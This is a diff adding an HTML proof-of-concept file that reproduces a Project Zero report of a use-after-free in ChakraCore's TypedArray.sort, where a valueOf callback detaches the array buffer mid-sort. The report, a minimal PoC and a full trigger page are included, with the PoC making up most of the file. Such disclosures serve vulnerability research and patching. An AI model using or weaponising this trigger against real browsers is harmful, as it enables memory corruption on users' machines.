@@ -1,0 +1,90 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=983
+
+There is a use-after-free in TypedArray.sort. In TypedArrayCompareElementsHelper (https://chromium.googlesource.com/external/github.com/Microsoft/ChakraCore/+/TimeTravelDebugging/lib/Runtime/Library/TypedArray.cpp), the comparison function is called with the following code:
+
+ Var retVal = CALL_FUNCTION(compFn, CallInfo(CallFlags_Value, 3),
+                undefined,
+                JavascriptNumber::ToVarWithCheck((double)x, scriptContext),
+                JavascriptNumber::ToVarWithCheck((double)y, scriptContext));
+
+            Assert(TypedArrayBase::Is(contextArray[0]));
+            if (TypedArrayBase::IsDetachedTypedArray(contextArray[0]))
+            {
+                JavascriptError::ThrowTypeError(scriptContext, JSERR_DetachedTypedArray, _u("[TypedArray].prototype.sort"));
+            }
+
+            if (TaggedInt::Is(retVal))
+            {
+                return TaggedInt::ToInt32(retVal);
+            }
+
+            if (JavascriptNumber::Is_NoTaggedIntCheck(retVal))
+            {
+                dblResult = JavascriptNumber::GetValue(retVal);
+            }
+            else
+            {
+                dblResult = JavascriptConversion::ToNumber_Full(retVal, scriptContext);
+            }
+
+The TypeArray is checked to see if it has been detached, but then the return value from the function is converted to an integer, which can invoke valueOf. If this function detaches the TypedArray, one swap is perfomed on the buffer after it is freed.
+
+A minimal PoC is as follows, and a full PoC is attached.
+
+var buf = new ArrayBuffer( 0x10010);
+var numbers = new Uint8Array(buf);
+
+
+function v(){
+
+   postMessage("test", "http://127.0.0.1", [buf])
+   return 7;
+
+}
+
+function compareNumbers(a, b) {
+
+  return {valueOf : v};
+}
+
+numbers.sort(compareNumbers);
+
+This PoC works on 64-bit systems only.
+-->
+
+<html>
+<body>
+<script>
+
+var buf = new ArrayBuffer( 0x10010);
+var numbers = new Uint8Array(buf);
+var first = 0;
+
+
+function v(){
+  alert("in v");
+  if( first == 0){
+	   postMessage("test", "http://127.0.0.1", [buf])
+	first++;
+	}
+   return 7;
+
+}
+
+function compareNumbers(a, b) {
+  alert("in func");
+
+  return {valueOf : v};
+}
+
+try{
+	numbers.sort(compareNumbers);
+}catch(e){
+
+	alert(e.message);
+
+}
+</script>
+</body>
+</html>
